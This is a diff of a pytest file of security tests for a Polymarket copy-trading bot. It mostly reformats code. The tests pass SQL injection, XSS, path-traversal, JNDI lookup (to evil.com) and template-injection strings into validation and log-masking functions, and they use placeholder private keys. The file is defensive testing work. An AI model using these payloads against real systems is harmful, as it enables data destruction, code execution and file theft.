@@ -1,17 +1,14 @@
 """
 Security integration tests for input validation and exploit prevention.
 """
-import pytest
-import asyncio
-import json
-from unittest.mock import patch, Mock, AsyncMock
-from datetime import datetime, timedelta
 
-from main import PolymarketCopyBot
-from core.clob_client import PolymarketClient
-from core.wallet_monitor import WalletMonitor
-from core.trade_executor import TradeExecutor
-from utils.security import validate_private_key, mask_sensitive_data
+import asyncio
+from datetime import datetime, timedelta
+from unittest.mock import patch
+
+import pytest
+
+from utils.security import mask_sensitive_data, validate_private_key
 
 
 class TestInputValidationSecurity:
@@ -44,15 +41,18 @@ class TestInputValidationSecurity:
         for valid_key in valid_keys:
             assert validate_private_key(valid_key)
 
-    @pytest.mark.parametrize("malicious_input", [
-        "'; DROP TABLE users; --",
-        "<script>alert('xss')</script>",
-        "../../../etc/passwd",
-        "javascript:alert('xss')",
-        "${jndi:ldap://evil.com}",
-        "{{7*7}}",  # SSTI attempt
-        "SELECT * FROM sensitive_data",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "'; DROP TABLE users; --",
+            "<script>alert('xss')</script>",
+            "../../../etc/passwd",
+            "javascript:alert('xss')",
+            "${jndi:ldap://evil.com}",
+            "{{7*7}}",  # SSTI attempt
+            "SELECT * FROM sensitive_data",
+        ],
+    )
     def test_malicious_input_injection_prevention(self, malicious_input):
         """Test that malicious inputs are properly handled."""
         # Test that sensitive data masking doesn't crash on malicious input
@@ -96,15 +96,15 @@ class TestTradeDataValidationSecurity:
     def test_trade_data_sql_injection_prevention(self, mock_trade_executor):
         """Test that trade data cannot contain SQL injection."""
         malicious_trade = {
-            'tx_hash': "0x'; DROP TABLE trades; --",
-            'timestamp': datetime.now(),
-            'wallet_address': "0x'; DELETE FROM wallets; --",
-            'condition_id': "0x'; UPDATE users SET admin=1; --",
-            'side': "BUY'; --",
-            'amount': 100.0,
-            'price': 0.65,
-            'token_id': "0x'; SELECT * FROM secrets; --",
-            'confidence_score': 0.8
+            "tx_hash": "0x'; DROP TABLE trades; --",
+            "timestamp": datetime.now(),
+            "wallet_address": "0x'; DELETE FROM wallets; --",
+            "condition_id": "0x'; UPDATE users SET admin=1; --",
+            "side": "BUY'; --",
+            "amount": 100.0,
+            "price": 0.65,
+            "token_id": "0x'; SELECT * FROM secrets; --",
+            "confidence_score": 0.8,
         }
 
         # Validation should still work
@@ -115,15 +115,15 @@ class TestTradeDataValidationSecurity:
     def test_trade_data_xss_prevention(self, mock_trade_executor):
         """Test that trade data cannot contain XSS."""
         xss_trade = {
-            'tx_hash': '0x<script>alert("xss")</script>',
-            'timestamp': datetime.now(),
-            'wallet_address': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'condition_id': '0x1234567890abcdef1234567890abcdef12345678',
-            'side': 'BUY',
-            'amount': 100.0,
-            'price': 0.65,
-            'token_id': '0xabcdef1234567890abcdef1234567890abcdef12',
-            'confidence_score': 0.8
+            "tx_hash": '0x<script>alert("xss")</script>',
+            "timestamp": datetime.now(),
+            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
+            "side": "BUY",
+            "amount": 100.0,
+            "price": 0.65,
+            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
+            "confidence_score": 0.8,
         }
 
         is_valid = mock_trade_executor._validate_trade(xss_trade)
@@ -132,15 +132,15 @@ class TestTradeDataValidationSecurity:
     def test_extreme_values_rejection(self, mock_trade_executor):
         """Test that extreme values are rejected."""
         extreme_trade = {
-            'tx_hash': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'timestamp': datetime.now(),
-            'wallet_address': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'condition_id': '0x1234567890abcdef1234567890abcdef12345678',
-            'side': 'BUY',
-            'amount': 999999999999999,  # Extreme amount
-            'price': 1.5,  # Invalid price (> 0.99)
-            'token_id': '0xabcdef1234567890abcdef1234567890abcdef12',
-            'confidence_score': 0.8
+            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "timestamp": datetime.now(),
+            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
+            "side": "BUY",
+            "amount": 999999999999999,  # Extreme amount
+            "price": 1.5,  # Invalid price (> 0.99)
+            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
+            "confidence_score": 0.8,
         }
 
         is_valid = mock_trade_executor._validate_trade(extreme_trade)
@@ -149,15 +149,15 @@ class TestTradeDataValidationSecurity:
     def test_negative_values_rejection(self, mock_trade_executor):
         """Test that negative values are rejected."""
         negative_trade = {
-            'tx_hash': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'timestamp': datetime.now(),
-            'wallet_address': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'condition_id': '0x1234567890abcdef1234567890abcdef12345678',
-            'side': 'BUY',
-            'amount': -100.0,  # Negative amount
-            'price': 0.65,
-            'token_id': '0xabcdef1234567890abcdef1234567890abcdef12',
-            'confidence_score': 0.8
+            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "timestamp": datetime.now(),
+            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
+            "side": "BUY",
+            "amount": -100.0,  # Negative amount
+            "price": 0.65,
+            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
+            "confidence_score": 0.8,
         }
 
         is_valid = mock_trade_executor._validate_trade(negative_trade)
@@ -168,7 +168,9 @@ class TestRateLimitingSecurity:
     """Test rate limiting security."""
 
     @pytest.mark.asyncio
-    async def test_api_rate_limiting_prevents_abuse(self, mock_wallet_monitor, mock_aiohttp_session, mock_polygonscan_response):
+    async def test_api_rate_limiting_prevents_abuse(
+        self, mock_wallet_monitor, mock_aiohttp_session, mock_polygonscan_response
+    ):
         """Test that API rate limiting prevents abuse."""
         mock_wallet_monitor.polygonscan_api_key = "test-api-key"
 
@@ -233,8 +235,8 @@ class TestCircuitBreakerSecurity:
 
         result = await mock_trade_executor.execute_copy_trade(sample_trade)
 
-        assert result['status'] == 'skipped'
-        assert 'Circuit breaker' in result['reason']
+        assert result["status"] == "skipped"
+        assert "Circuit breaker" in result["reason"]
 
 
 class TestUnauthorizedAccessPrevention:
@@ -243,15 +245,15 @@ class TestUnauthorizedAccessPrevention:
     def test_invalid_wallet_address_rejection(self, mock_trade_executor):
         """Test that invalid wallet addresses are rejected."""
         invalid_trade = {
-            'tx_hash': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'timestamp': datetime.now(),
-            'wallet_address': 'invalid-address',  # Invalid
-            'condition_id': '0x1234567890abcdef1234567890abcdef12345678',
-            'side': 'BUY',
-            'amount': 10.0,
-            'price': 0.65,
-            'token_id': '0xabcdef1234567890abcdef1234567890abcdef12',
-            'confidence_score': 0.8
+            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "timestamp": datetime.now(),
+            "wallet_address": "invalid-address",  # Invalid
+            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
+            "side": "BUY",
+            "amount": 10.0,
+            "price": 0.65,
+            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
+            "confidence_score": 0.8,
         }
 
         # This should not cause crashes, should be handled gracefully
@@ -261,15 +263,15 @@ class TestUnauthorizedAccessPrevention:
     def test_malformed_transaction_data_handling(self, mock_wallet_monitor):
         """Test handling of malformed transaction data."""
         malformed_tx = {
-            'hash': None,  # Invalid
-            'from': 'invalid-address',
-            'to': 12345,  # Invalid type
-            'value': 'not-a-number',
-            'gasUsed': 'invalid',
-            'gasPrice': {},
-            'timeStamp': 'invalid-timestamp',
-            'input': None,
-            'blockNumber': []
+            "hash": None,  # Invalid
+            "from": "invalid-address",
+            "to": 12345,  # Invalid type
+            "value": "not-a-number",
+            "gasUsed": "invalid",
+            "gasPrice": {},
+            "timeStamp": "invalid-timestamp",
+            "input": None,
+            "blockNumber": [],
         }
 
         # Should not crash
@@ -300,67 +302,68 @@ class TestDataLeakagePrevention:
     def test_private_key_masking_in_logs(self):
         """Test that private keys are masked in logged data."""
         test_data = {
-            'private_key': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'wallet_address': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'api_key': 'sk_live_1234567890abcdef',
-            'normal_data': 'this is normal',
-            'amount': 100.0
+            "private_key": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "api_key": "sk_live_1234567890abcdef",
+            "normal_data": "this is normal",
+            "amount": 100.0,
         }
 
         masked = mask_sensitive_data(test_data)
 
         # Sensitive data should be masked
-        assert masked['private_key'] == '0x1234...[REDACTED]'
-        assert masked['wallet_address'] == '0x742d...8f44e'
-        assert masked['api_key'] == '[REDACTED]'
+        assert masked["private_key"] == "0x1234...[REDACTED]"
+        assert masked["wallet_address"] == "0x742d...8f44e"
+        assert masked["api_key"] == "[REDACTED]"
 
         # Normal data should not be masked
-        assert masked['normal_data'] == 'this is normal'
-        assert masked['amount'] == 100.0
+        assert masked["normal_data"] == "this is normal"
+        assert masked["amount"] == 100.0
 
     def test_no_data_leakage_in_error_messages(self, mock_trade_executor):
         """Test that sensitive data doesn't leak in error messages."""
         # Create trade with sensitive data
         sensitive_trade = {
-            'tx_hash': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'timestamp': datetime.now(),
-            'wallet_address': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'condition_id': '0x1234567890abcdef1234567890abcdef12345678',
-            'side': 'BUY',
-            'amount': 1000000.0,  # Very large amount that might trigger errors
-            'price': 0.65,
-            'token_id': '0xabcdef1234567890abcdef1234567890abcdef12',
-            'confidence_score': 0.8
+            "tx_hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "timestamp": datetime.now(),
+            "wallet_address": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "condition_id": "0x1234567890abcdef1234567890abcdef12345678",
+            "side": "BUY",
+            "amount": 1000000.0,  # Very large amount that might trigger errors
+            "price": 0.65,
+            "token_id": "0xabcdef1234567890abcdef1234567890abcdef12",
+            "confidence_score": 0.8,
         }
 
         # This should trigger position size rejection
         result = mock_trade_executor._apply_risk_management(sensitive_trade)
 
         # Error message should not contain sensitive wallet addresses
-        assert '0x742d35Cc6634C0532925a3b844Bc454e4438f44e' not in result['reason']
+        assert "0x742d35Cc6634C0532925a3b844Bc454e4438f44e" not in result["reason"]
 
     def test_secure_error_logging(self):
         """Test that errors are logged securely."""
-        from utils.security import secure_log
         import logging
 
-        logger = logging.getLogger('test')
+        from utils.security import secure_log
+
+        logger = logging.getLogger("test")
         logger.setLevel(logging.INFO)
 
-        with patch.object(logger, 'error') as mock_log:
+        with patch.object(logger, "error") as mock_log:
             error_data = {
-                'private_key': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-                'error': 'API connection failed',
-                'wallet': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+                "private_key": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+                "error": "API connection failed",
+                "wallet": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
             }
 
-            secure_log(logger, 'error_event', error_data, level='error')
+            secure_log(logger, "error_event", error_data, level="error")
 
             # Check that the logged message masks sensitive data
             logged_call = mock_log.call_args[0][0]
-            assert '0x1234...[REDACTED]' in logged_call
-            assert '0x742d...8f44e' in logged_call
-            assert 'API connection failed' in logged_call
+            assert "0x1234...[REDACTED]" in logged_call
+            assert "0x742d...8f44e" in logged_call
+            assert "API connection failed" in logged_call
 
 
 class TestConfigurationSecurity:
@@ -370,21 +373,29 @@ class TestConfigurationSecurity:
         """Test that environment variables are properly isolated."""
         # This test ensures that sensitive environment variables
         # don't leak into configuration or logs
-        with patch.dict('os.environ', {
-            'PRIVATE_KEY': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'API_KEY': 'sk_live_secret',
-            'NORMAL_VAR': 'normal_value',
-            'PATH': '/usr/bin:/bin',  # System variable
-        }):
+        with patch.dict(
+            "os.environ",
+            {
+                "PRIVATE_KEY": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+                "API_KEY": "sk_live_secret",
+                "NORMAL_VAR": "normal_value",
+                "PATH": "/usr/bin:/bin",  # System variable
+            },
+        ):
             from config.settings import Settings
+
             settings = Settings()
 
             # Sensitive environment variables should be loaded
-            assert settings.trading.private_key == '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef'
+            assert (
+                settings.trading.private_key
+                == "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+            )
 
             # But they should not appear in environment hash
             from utils.helpers import generate_environment_hash
-            env_hash = generate_environment_hash()
+
+            generate_environment_hash()
 
             # Environment hash should not contain sensitive data
             # (This is tested by the fact that sensitive vars are filtered out)
@@ -396,19 +407,19 @@ class TestBlockchainSecurity:
     @pytest.mark.asyncio
     async def test_transaction_replay_prevention(self, mock_wallet_monitor):
         """Test that transactions are not processed multiple times."""
-        tx_hash = '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef'
+        tx_hash = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
 
         # Create transaction data
         tx = {
-            'hash': tx_hash,
-            'from': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'to': mock_wallet_monitor.polymarket_contracts[0],
-            'value': '0',
-            'gasUsed': '150000',
-            'gasPrice': '50000000000',
-            'timeStamp': str(int((datetime.now() - timedelta(minutes=5)).timestamp())),
-            'input': '0x1234567890abcdef',
-            'blockNumber': '50000000'
+            "hash": tx_hash,
+            "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "to": mock_wallet_monitor.polymarket_contracts[0],
+            "value": "0",
+            "gasUsed": "150000",
+            "gasPrice": "50000000000",
+            "timeStamp": str(int((datetime.now() - timedelta(minutes=5)).timestamp())),
+            "input": "0x1234567890abcdef",
+            "blockNumber": "50000000",
         }
 
         # First processing
@@ -425,15 +436,15 @@ class TestBlockchainSecurity:
         """Test that very recent transactions are filtered to prevent reorg issues."""
         # Create very recent transaction
         tx = {
-            'hash': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
-            'from': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-            'to': mock_wallet_monitor.polymarket_contracts[0],
-            'value': '0',
-            'gasUsed': '150000',
-            'gasPrice': '50000000000',
-            'timeStamp': str(int(datetime.now().timestamp())),  # Current time
-            'input': '0x1234567890abcdef',
-            'blockNumber': '50000000'
+            "hash": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+            "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+            "to": mock_wallet_monitor.polymarket_contracts[0],
+            "value": "0",
+            "gasUsed": "150000",
+            "gasPrice": "50000000000",
+            "timeStamp": str(int(datetime.now().timestamp())),  # Current time
+            "input": "0x1234567890abcdef",
+            "blockNumber": "50000000",
         }
 
         trades = mock_wallet_monitor.detect_polymarket_trades([tx])
@@ -451,15 +462,15 @@ class TestMemorySafety:
         transactions = []
         for i in range(1000):
             tx = {
-                'hash': f'0x{i:064x}',
-                'from': '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-                'to': mock_wallet_monitor.polymarket_contracts[0],
-                'value': '0',
-                'gasUsed': '150000',
-                'gasPrice': '50000000000',
-                'timeStamp': str(int((datetime.now() - timedelta(hours=i)).timestamp())),
-                'input': f'0x1234567890abcdef{i:016x}',
-                'blockNumber': str(50000000 + i)
+                "hash": f"0x{i:064x}",
+                "from": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+                "to": mock_wallet_monitor.polymarket_contracts[0],
+                "value": "0",
+                "gasUsed": "150000",
+                "gasPrice": "50000000000",
+                "timeStamp": str(int((datetime.now() - timedelta(hours=i)).timestamp())),
+                "input": f"0x1234567890abcdef{i:016x}",
+                "blockNumber": str(50000000 + i),
             }
             transactions.append(tx)
 
@@ -472,19 +483,17 @@ class TestMemorySafety:
 
     def test_trade_history_memory_limits(self, mock_wallet_monitor):
         """Test that trade history is limited to prevent memory bloat."""
-        wallet = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'
+        wallet = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
 
         # Add many trades to history
         for i in range(200):  # More than the 100 limit
-            trade = {
-                'tx_hash': f'0x{i:064x}',
-                'timestamp': datetime.now(),
-                'amount': 10.0
-            }
+            trade = {"tx_hash": f"0x{i:064x}", "timestamp": datetime.now(), "amount": 10.0}
             mock_wallet_monitor.wallet_trade_history[wallet].append(trade)
 
         # Simulate the cleanup that happens in monitor_wallets
-        mock_wallet_monitor.wallet_trade_history[wallet] = mock_wallet_monitor.wallet_trade_history[wallet][-100:]
+        mock_wallet_monitor.wallet_trade_history[wallet] = mock_wallet_monitor.wallet_trade_history[
+            wallet
+        ][-100:]
 
         # Should be limited to 100 trades
         assert len(mock_wallet_monitor.wallet_trade_history[wallet]) <= 100
